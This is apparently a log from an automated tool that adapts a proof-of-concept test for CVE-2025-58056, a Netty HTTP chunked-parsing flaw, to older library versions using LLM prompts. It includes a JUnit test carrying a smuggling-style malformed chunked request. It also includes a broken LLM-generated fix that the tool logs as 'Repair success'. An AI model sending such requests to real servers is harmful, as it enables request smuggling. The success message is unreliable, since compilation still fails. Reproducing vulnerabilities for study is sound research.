[92m[Preparer] Updated dependency version to 4.0.0.CR5 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR5/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR5...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR5...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR5[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR5[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR4[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR5 at index 15[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR4[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR5/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR4/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR4 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR4/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR4 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR4/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR4...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR4...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR4[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR4[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR3[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR4 at index 14[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR3[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR4/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR3/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR3 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR3/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR3 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR3/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR3...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR3...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 4.0.0.CR4 to 4.0.0.CR3...[0m
[96m[Adapter] Start adapting exploit from 4.0.0.CR4 to 4.0.0.CR3"[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR3...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 17 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,33] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class EmbeddedChannel[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package io.netty.channel.embedded[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class EmbeddedChannel[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class com.example.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,39] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class EmbeddedChannel[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class com.example.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2106 (prompt), 1 (completion), 2107 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 4.0.0.CR3:io.netty:netty-codec-http.
This test file compiles and runs successfully with version 4.0.0.CR4.

Your task is to:
1. Analyze why this issue occurs with the *4.0.0.CR4* but not with the *4.0.0.CR3 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------------< com.example:demo >--------------------------
[INFO] Building demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:3.1.0:clean (default-clean) @ demo ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ demo ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:testResources (default-testResources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:testCompile (default-testCompile) @ demo ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,33] cannot find symbol
  symbol:   class EmbeddedChannel
  location: package io.netty.channel.embedded
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] cannot find symbol
  symbol:   class EmbeddedChannel
  location: class com.example.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,39] cannot find symbol
  symbol:   class EmbeddedChannel
  location: class com.example.Testcase1
[INFO] 3 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.869 s
[INFO] Finished at: 2025-09-25T06:05:37Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,33] cannot find symbol
[ERROR]   symbol:   class EmbeddedChannel
[ERROR]   location: package io.netty.channel.embedded
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,9] cannot find symbol
[ERROR]   symbol:   class EmbeddedChannel
[ERROR]   location: class com.example.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,39] cannot find symbol
[ERROR]   symbol:   class EmbeddedChannel
[ERROR]   location: class com.example.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.example</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>demo</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>io.netty</groupId>
        <artifactId>netty-codec-http</artifactId>
        <version>4.0.0.CR3</version>
    </dependency>
        
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle -->
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifactId>
          <version>3.0.0</version>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>

[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'cannot find symbol | class EmbeddedChannel': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 13, 'column': 33, 'message': 'cannot find symbol', 'symbol': 'class EmbeddedChannel', 'location': 'package io.netty.channel.embedded', 'code_line': 'import io.netty.channel.embedded.EmbeddedChannel;'}, {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 38, 'column': 9, 'message': 'cannot find symbol', 'symbol': 'class EmbeddedChannel', 'location': 'class com.example.Testcase1', 'code_line': '        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());'}, {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 38, 'column': 39, 'message': 'cannot find symbol', 'symbol': 'class EmbeddedChannel', 'location': 'class com.example.Testcase1', 'code_line': '        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());'}]}
[LLMClient] Tokens used: 147 (prompt), 11 (completion), 158 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.0.CR3: 

Error: cannot find symbol, class EmbeddedChannel, package io.netty.channel.embedded 

The test executes as expected in 4.0.0.CR4 

Error code: import io.netty.channel.embedded.EmbeddedChannel; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
EmbeddedChannel;io.netty.channel.embedded
[96m[ErrorManager] Extracted key entities: ['EmbeddedChannel', 'io.netty.channel.embedded'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 13, 'column': 33, 'message': 'cannot find symbol', 'symbol': 'class EmbeddedChannel', 'location': 'package io.netty.channel.embedded', 'code_line': 'import io.netty.channel.embedded.EmbeddedChannel;'} with cause: ['EmbeddedChannel', 'io.netty.channel.embedded'][0m
[96m[Adapter] Related diffs for error: [(1342, 18.0), (136, 8.0), (138, 8.0), (144, 8.0), (146, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class EmbeddedChannel cause: ['EmbeddedChannel', 'io.netty.channel.embedded'][0m
[96m[RepairModule] Trying best diff #1342 with score 18.00[0m
[LLMClient] Tokens used: 1682 (prompt), 477 (completion), 2159 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 4.0.0.CR3:io.netty:netty-codec-http.
This test file compiles and runs successfully in 4.0.0.CR4.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 4.0.0.CR4 to 4.0.0.CR3.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class EmbeddedChannel, location: package io.netty.channel.embedded

### Error Position:
import io.netty.channel.embedded.EmbeddedChannel;

### Related Diff:
Operation: MODIFIED, File: transport/src/main/java/io/netty/channel/embedded/EmbeddedChannel.java, Hunk: @@ -15,92 +15,81 @@
  */
 package io.netty.channel.embedded;

+import io.netty.buffer.Buf;
+import io.netty.buffer.ByteBuf;
+import io.netty.buffer.MessageBuf;
+import io.netty.buffer.Unpooled;
 import io.netty.channel.AbstractChannel;
 import io.netty.channel.Channel;
 import io.netty.channel.ChannelConfig;
 import io.netty.channel.ChannelFuture;
 import io.netty.channel.ChannelHandler;
 import io.netty.channel.ChannelHandlerContext;
+import io.netty.channel.ChannelInboundByteHandler;
+import io.netty.channel.ChannelInboundMessageHandler;
-import io.netty.channel.ChannelInboundHandlerAdapter;
-import io.netty.channel.ChannelMetadata;
 import io.netty.channel.ChannelPipeline;
 import io.netty.channel.ChannelPromise;
+import io.netty.channel.ChannelStateHandlerAdapter;
 import io.netty.channel.DefaultChannelConfig;
 import io.netty.channel.EventLoop;
-import io.netty.channel.MessageList;
 import io.netty.util.internal.PlatformDependent;
 import io.netty.util.internal.logging.InternalLogger;
 import io.netty.util.internal.logging.InternalLoggerFactory;

 import java.net.SocketAddress;
 import java.nio.channels.ClosedChannelException;
-import java.util.ArrayDeque;
-import java.util.Queue;

 /**
  * Base class for {@link Channel} implementations that are used in an embedded fashion.
+ *
+ * @param <O>  the type of data that can be written to this {@link Channel}
  */
+public abstract class AbstractEmbeddedChannel<O> extends AbstractChannel {
-public class EmbeddedChannel extends AbstractChannel {
-
-    private static final InternalLogger logger = InternalLoggerFactory.getInstance(EmbeddedChannel.class);

+    private static final InternalLogger logger = InternalLoggerFactory.getInstance(AbstractEmbeddedChannel.class);
-    private static final ChannelMetadata METADATA = new ChannelMetadata(false);

     private final EmbeddedEventLoop loop = new EmbeddedEventLoop();
     private final ChannelConfig config = new DefaultChannelConfig(this);
     private final SocketAddress localAddress = new EmbeddedSocketAddress();
     private final SocketAddress remoteAddress = new EmbeddedSocketAddress();
+    private final MessageBuf<Object> lastInboundMessageBuffer = Unpooled.messageBuffer().retain(2);
+    private final ByteBuf lastInboundByteBuffer = Unpooled.buffer().retain(2);
+    protected final Object lastOutboundBuffer;
-    private final Queue<Object> lastInboundBuffer = new ArrayDeque<Object>();
-    private final Queue<Object> lastOutboundBuffer = new ArrayDeque<Object>();
     private Throwable lastException;
     private int state; // 0 = OPEN, 1 = ACTIVE, 2 = CLOSED

     /**
      * Create a new instance
      *
+     * @param lastOutboundBuffer    the last outbound buffer which will hold all the written data
+     * @param handlers              the @link ChannelHandler}s which will be add in the {@link ChannelPipeline}
-     * @param handlers the @link ChannelHandler}s which will be add in the {@link ChannelPipeline}
      */
+    AbstractEmbeddedChannel(Object lastOutboundBuffer, ChannelHandler... handlers) {
-    public EmbeddedChannel(ChannelHandler... handlers) {
         super(null, null);

         if (handlers == null) {
             throw new NullPointerException("handlers");
         }

+        this.lastOutboundBuffer = lastOutboundBuffer;
+
         int nHandlers = 0;
+        boolean hasBuffer = false;
         ChannelPipeline p = pipeline();
         for (ChannelHandler h: handlers) {
             if (h == null) {
                 break;
             }
             nHandlers ++;
+            ChannelHandlerContext ctx = p.addLast(h).context(h);
+
+            if (ctx.hasInboundByteBuffer() || ctx.hasOutboundByteBuffer()
+                    || ctx.hasInboundMessageBuffer() || ctx.hasOutboundMessageBuffer()) {
+                hasBuffer = true;
+            }
-            p.addLast(h);
         }

         if (nHandlers == 0) {
             throw new IllegalArgumentException("handlers is empty.");
         }

+        if (!hasBuffer) {
+            throw new IllegalArgumentException("handlers does not provide any buffers.");
+        }
+
+        p.addLast(new LastInboundMessageHandler(), new LastInboundByteHandler());

### Test File Content:
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding") && "chunked".equals(request.headers().get("Transfer-Encoding")));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}



[LLMClient] Response: 
```java
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.AbstractEmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding") && "chunked".equals(request.headers().get("Transfer-Encoding")));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR3...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 10 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,43] AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,123] <anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | class EmbeddedChannel'}
[RepairModule] New grouped keys: {'<anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel |', 'AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package |'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 38, Column: 123
  Message  : <anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel
  Symbol   : None
  Location : None
  Code     : AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};
  Position : after the fixing line (13)[0m
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 38, Column: 43
  Message  : AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package
  Symbol   : None
  Location : None
  Code     : AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};
  Position : after the fixing line (13)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR3...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 10 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,43] AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,123] <anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2169 (prompt), 1 (completion), 2170 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 4.0.0.CR3:io.netty:netty-codec-http.
This test file compiles and runs successfully with version 4.0.0.CR4.

Your task is to:
1. Analyze why this issue occurs with the *4.0.0.CR4* but not with the *4.0.0.CR3 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------------< com.example:demo >--------------------------
[INFO] Building demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:3.1.0:clean (default-clean) @ demo ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ demo ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:testResources (default-testResources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:testCompile (default-testCompile) @ demo ---
